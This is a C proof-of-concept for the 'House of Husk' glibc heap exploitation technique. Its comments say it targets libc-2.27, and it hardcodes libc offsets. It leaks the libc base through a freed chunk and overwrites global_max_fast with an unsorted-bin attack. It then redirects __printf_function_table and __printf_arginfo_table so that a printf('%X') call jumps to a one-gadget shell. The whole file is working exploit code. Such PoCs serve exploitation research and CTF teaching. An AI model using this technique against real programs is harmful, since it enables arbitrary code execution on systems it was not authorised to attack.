/**
 * This is a Proof-of-Concept for House of Husk
 * This PoC is supposed to be run with libc-2.27.
 */
#include <stdio.h>
#include <stdlib.h>

#define offset2size(ofs) ((ofs) * 2 - 0x10)
#define MAIN_ARENA       0x3c4b20
#define MAIN_ARENA_DELTA 0x58
#define GLOBAL_MAX_FAST  0x3c67f8
#define PRINTF_FUNCTABLE 0x3c9468
#define PRINTF_ARGINFO   0x3c5730
#define ONE_GADGET       0x45216

int main (void)
{
  unsigned long libc_base;
  char *a[10];
  setbuf(stdout, NULL); // make printf quiet

  /* leak libc */
  a[0] = malloc(0x500); /* UAF chunk */
  a[1] = malloc(2*(PRINTF_FUNCTABLE - MAIN_ARENA));
  a[2] = malloc(2*(PRINTF_ARGINFO - MAIN_ARENA));
  a[3] = malloc(0x20);
  a[4] = malloc(0x500); /* avoid consolidation */
  free(a[0]);
  libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;
  printf("libc @ 0x%lxn", libc_base);

  /* prepare fake printf arginfo table */
  //*(unsigned long*)(a[2] + ('X' - 2) * 8) = libc_base + ONE_GADGET;
  *(unsigned long*)(a[1] + ('X' - 2) * 8) = libc_base + ONE_GADGET;
    //now __printf_arginfo_table['X'] = one_gadget;

  /* unsorted bin attack */
  *(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;
  a[0] = malloc(0x500); /* overwrite global_max_fast */

  /* overwrite __printf_arginfo_table and __printf_function_table */
  free(a[3]);
  //free(a[1]);// __printf_function_table => a heap_addr which is not NULL
  //free(a[2]);//__printf_arginfo_table => one_gadget

  *(unsigned long*)(libc_base+PRINTF_FUNCTABLE) = (unsigned long int)a[1]-0x10;
  *(unsigned long*)(libc_base+PRINTF_ARGINFO) = (unsigned long int)a[2]-0x10;

  /* ignite! */
  printf("%X", 0);

  return 0;
}
